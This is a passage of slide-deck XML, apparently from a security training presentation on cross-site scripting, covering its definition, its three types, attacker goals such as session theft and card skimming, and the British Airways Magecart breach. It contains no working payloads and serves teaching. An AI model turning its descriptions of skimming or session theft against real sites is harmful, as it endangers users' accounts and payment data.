          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3566160"/>
            <a:ext cx="6629400" cy="1554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4600"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="4600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Cross-site scripting</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="808" name="Google Shape;808;p59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5212080"/>
            <a:ext cx="64922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0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Your input becomes part of someone else's page. Run your JavaScript in their browser.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="809" name="Google Shape;809;p59"/>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0" name="Google Shape;810;p59"/>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811" name="Google Shape;811;p59"/>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58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6" name="Shape 816"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="817" name="Google Shape;817;p60"/>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DEFINITION</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="818" name="Google Shape;818;p60"/>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is XSS?</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="819" name="Google Shape;819;p60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1965960"/>
            <a:ext cx="10607040" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 571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0" name="Google Shape;820;p60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1005840" y="2103120"/>
            <a:ext cx="987552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FB950"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t> is when an app puts untrusted input into a page without proper escaping, so attacker-controlled script runs in the victim's browser with the site's privileges - enabling session theft, keylogging, or account takeover.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="821" name="Google Shape;821;p60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="64008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2" name="Google Shape;822;p60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="91440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23" name="Google Shape;823;p60"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1057046" y="3983126"/>
            <a:ext cx="263347" cy="263347"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="824" name="Google Shape;824;p60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="91440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800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1800" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="58A6FF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Reflected</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="825" name="Google Shape;825;p60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="91440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payload in the URL, echoed back in the response</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="826" name="Google Shape;826;p60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="425196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7" name="Google Shape;827;p60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="452628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28" name="Google Shape;828;p60"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4668926" y="3983126"/>
            <a:ext cx="263347" cy="263347"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="829" name="Google Shape;829;p60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="452628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800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1800" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Stored</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="830" name="Google Shape;830;p60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="452628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saved by the app, fires for every viewer</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="831" name="Google Shape;831;p60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7863840" y="3566160"/>
            <a:ext cx="3383280" cy="2194560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 3333"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p60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="3840480"/>
            <a:ext cx="548640" cy="548640"/>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33" name="Google Shape;833;p60"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8280806" y="3983126"/>
            <a:ext cx="263347" cy="263347"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="834" name="Google Shape;834;p60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="4480560"/>
            <a:ext cx="28346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78BA"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1800" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="F778BA"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>DOM</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="835" name="Google Shape;835;p60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="4937760"/>
            <a:ext cx="283464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client JS writes your input into the page</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="836" name="Google Shape;836;p60"/>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60"/>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838" name="Google Shape;838;p60"/>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59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3" name="Shape 843"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="844" name="Google Shape;844;p61"/>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1200"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="F85149"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>REAL-WORLD IMPACT</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="845" name="Google Shape;845;p61"/>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What attackers actually do with XSS</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="846" name="Google Shape;846;p61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="210312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47" name="Google Shape;847;p61"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="2260031"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="848" name="Google Shape;848;p61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="205740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Steal sessions / take over accounts</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="849" name="Google Shape;849;p61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="242316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Ride the victim's logged-in session without their password.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="850" name="Google Shape;850;p61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="33375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51" name="Google Shape;851;p61"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="3494471"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="852" name="Google Shape;852;p61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="32918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Skim credit cards (Magecart)</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="853" name="Google Shape;853;p61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="365760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Inject JS that quietly captures checkout forms as users type.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="854" name="Google Shape;854;p61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="457200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55" name="Google Shape;855;p61"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="4728911"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="856" name="Google Shape;856;p61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="452628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Self-spreading worms</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="857" name="Google Shape;857;p61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="4892040"/>
            <a:ext cx="4846320" cy="850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Payloads that propagate from user to user automatically.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="858" name="Google Shape;858;p61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="2011680"/>
            <a:ext cx="4800600" cy="3931920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 1860"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p61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="228600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29922"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="D29922"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>WAR STORY</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="860" name="Google Shape;860;p61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="2615184"/>
            <a:ext cx="416052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1800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1800" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>British Airways, 2018</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="861" name="Google Shape;861;p61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="3200400"/>
            <a:ext cx="416052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85149"/>
              </a:buClr>
              <a:buSzPts val="4800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="4800" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="F85149"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>380,000</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="862" name="Google Shape;862;p61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="4023360"/>
            <a:ext cx="41605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card payments skimmed</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="863" name="Google Shape;863;p61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="4434840"/>
            <a:ext cx="4160520" cy="132588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 Magecart script injected into BA's site harvested card data at checkout for two weeks. The UK ICO fined BA £20M. (See also: the Samy worm hit 1M MySpace profiles in 20 hours.)</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="864" name="Google Shape;864;p61"/>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5" name="Google Shape;865;p61"/>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866" name="Google Shape;866;p61"/>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60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71" name="Shape 871"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="872" name="Google Shape;872;p62"/>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CONTEXT IS EVERYTHING</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="873" name="Google Shape;873;p62"/>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Same input, different escape</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
